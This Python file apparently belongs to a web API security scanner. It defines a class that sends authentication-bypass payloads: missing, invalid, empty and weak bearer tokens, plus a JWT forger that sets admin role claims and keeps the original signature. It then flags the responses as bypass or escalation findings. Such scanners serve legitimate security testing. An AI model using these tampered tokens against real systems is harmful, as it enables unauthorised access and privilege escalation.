import base64
import json


class AuthStrategyEngine:

    def __init__(self, auth_attacker):
        self.auth_attacker = auth_attacker

    def _tamper_jwt(self, token):
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return token

            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

            # 🔥 escalate privileges
            payload["role"] = "admin"
            payload["isAdmin"] = True

            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")

            # keep original signature (broken validation test)
            return f"{parts[0]}.{new_payload}.{parts[2]}"

        except Exception:
            return token

    def get_auth_payloads(self):
        return [
            {"headers": {}},  # no auth

            {"headers": {"Authorization": "Bearer invalid.token.here"}},

            {"headers": {"Authorization": "Bearer null"}},

            {"headers": {"Authorization": "Bearer "}},  # empty token

            # common weak tokens
            {"headers": {"Authorization": "Bearer admin"}},
            {"headers": {"Authorization": "Bearer user"}},

            # tampered JWT (if scanner captures real token later)
            {"__tamper_jwt__": True},
        ]

    def inject_token(self, payload, token):
        if not token:
            return payload

        headers = payload.get("headers", {})
        headers["Authorization"] = f"Bearer {token}"
        payload["headers"] = headers

        return payload

    def process(self, endpoint, payload, result, memory):

        findings = []

        status = result.get("status_code", 0)
        body = str(result.get("response_body", "")).lower()

        # -------------------------
        # 1. NO AUTH BUT ACCESS
        # -------------------------
        if not payload.get("headers") and status == 200:
            findings.append({
                "type": "Auth Bypass (No Token Required)",
                "severity": "CRITICAL"
            })

        # -------------------------
        # 2. INVALID TOKEN ACCEPTED
        # -------------------------
        auth_header = payload.get("headers", {}).get("Authorization", "")

        if "invalid" in auth_header and status == 200:
            findings.append({
                "type": "Auth Bypass (Invalid Token Accepted)",
                "severity": "CRITICAL"
            })

        # -------------------------
        # 3. ROLE ESCALATION
        # -------------------------
        if "admin" in body and status == 200:
            findings.append({
                "type": "Privilege Escalation / Broken Authorization",
                "severity": "HIGH"
            })

        # -------------------------
        # 4. TOKEN LEAK
        # -------------------------
        if "token" in body or "jwt" in body:
            findings.append({
                "type": "Token Exposure",
                "severity": "HIGH"
            })

        # -------------------------
        # 5. WEAK AUTH RESPONSE
        # -------------------------
        if status == 200 and "unauthorized" in body:
            findings.append({
                "type": "Broken Auth Logic (200 with Unauthorized)",
                "severity": "HIGH"
            })

        return findings